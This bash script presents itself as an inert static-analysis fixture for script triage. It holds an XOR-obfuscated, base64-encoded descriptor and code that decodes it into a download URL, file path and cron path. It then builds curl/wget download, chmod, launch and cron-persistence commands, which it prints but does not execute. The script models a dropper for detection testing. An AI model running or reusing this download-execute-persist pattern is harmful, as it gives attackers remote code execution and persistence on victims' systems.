#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_6fae06a0='WBfQpwtaT5GoRV5Yjr0RQk++sxddXs26G19fiKkdcViEthdaT82sCkdehIQeR0aE9xtGS4+8HXFHjr8dAk6IqAhPXoKzJ15YjrgdXVmduhxPWpW+ChNdhr4McUuTuBBxTIC3FExLgrAEXV6AvB1xSY6uFloX1KcbT0eRuhFJRL6yHBNJgLYIT0OGtVUfSde9HRhO0ukbUl+Tt0VGXpWrCxQFzuobGEyE7RwdGIL1HVZLjKsUSwSItQ5PRoi/VxZOh79ISEvV9QtGVpSoHVx1gLwdQF7ckw1AXpO+C11mgLlXH0nXvR0YTtLpG1JMiLcdcVqArxATBZW2CAFClLUMXE+SqFVNS4KzHQEEkq8ZSU/M6hsYTITtHB0YgqcZXEmJhAhcRYO+RVtEgLYdA0edqB1cXIi4HXFEgLYdE1+RvxlaT8zqGxhMhO0cHRiC9QtLWJeyG0tWgqkXQHWRugxGF86+DE0FgqkXQASF9A1eToCvHQMbgu0eSxyF6EpN'
  readonly Codec_6fae06a0='base64_literal|repeating_key_xor|2e,2a,e1,db,78'

  Load_6fae06a0() {
    EnCoDeD_Bytes=()
    local PaRt
    while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_6fae06a0}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_6fae06a0() {
    DeCoDeD_Bytes=()
    local -a key_bytes=(46 42 225 219 120)
    local InDeX
    for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
      DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ key_bytes[InDeX % ${#key_bytes[@]}]))")
    done
  }

  Recover_6fae06a0() {
    local -a EnCoDeD_Bytes DeCoDeD_Bytes
    local DeScRiPtOr_Text NeUtRaL PaSs InDeX
    local -a series=(3 5 8 13); NeUtRaL="${series[*]:1:2}"
    Load_6fae06a0
    if ! Decode_6fae06a0; then return 71; fi
    DeScRiPtOr_Text=''
    local octal character
    for InDeX in "${!DeCoDeD_Bytes[@]}"; do
      printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
      printf -v character '%b' "\\$octal"
      DeScRiPtOr_Text+="$character"
    done
    printf '%s\n' "$DeScRiPtOr_Text"
  }

  Inspect_6fae06a0() { local recovered; recovered="$(Recover_6fae06a0)"; printf '%s\n' "$recovered"; }

  Plan_6fae06a0() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_6fae06a0)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
    declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_6fae06a0; fi
